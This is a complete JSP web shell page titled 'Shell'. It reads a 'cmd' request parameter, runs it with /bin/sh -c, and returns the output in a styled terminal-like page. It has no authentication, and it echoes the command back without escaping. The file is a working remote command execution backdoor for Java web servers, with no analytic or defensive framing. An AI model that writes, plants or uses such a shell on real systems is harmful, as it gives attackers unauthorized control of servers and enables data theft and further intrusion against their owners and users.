<%@ page import="java.io.*" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shell</title>
    <style>
        body { background: #1e1e1e; color: #ddd; font-family: monospace; margin: 0; padding: 20px; }
        .header { background: #2d2d2d; padding: 10px; border-radius: 6px; margin-bottom: 15px; }
        .cmd-input { width: 80%; padding: 10px; background: #333; color: #0f0; border: none; border-radius: 4px; font-family: monospace; }
        .run-btn { padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .output { background: #1a1a1a; padding: 15px; border-radius: 6px; white-space: pre-wrap; overflow-x: auto; margin-top: 15px; }
        .prompt { color: #0f0; }
    </style>
</head>
<body>
    <div class="header">
        <strong>user:</strong> root | <strong>os:</strong> linux | <strong>cwd:</strong> /root
    </div>

    <form method="get">
        <span class="prompt">$</span>
        <input type="text" name="cmd" class="cmd-input" placeholder="whoami" value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "" %>" autofocus>
        <button type="submit" class="run-btn">Run</button>
    </form>

    <div class="output">
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.trim().isEmpty()) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            
            out.println("<strong>$ " + cmd + "</strong><br>");
            while ((line = br.readLine()) != null) {
                out.println(line + "<br>");
            }
            while ((line = err.readLine()) != null) {
                out.println("<span style='color:#ff6666;'>" + line + "</span><br>");
            }
        } catch (Exception e) {
            out.println("<span style='color:red;'>Error: " + e.getMessage() + "</span>");
        }
    } else {
        out.println("Run a command above...");
    }
%>
    </div>
</body>
</html>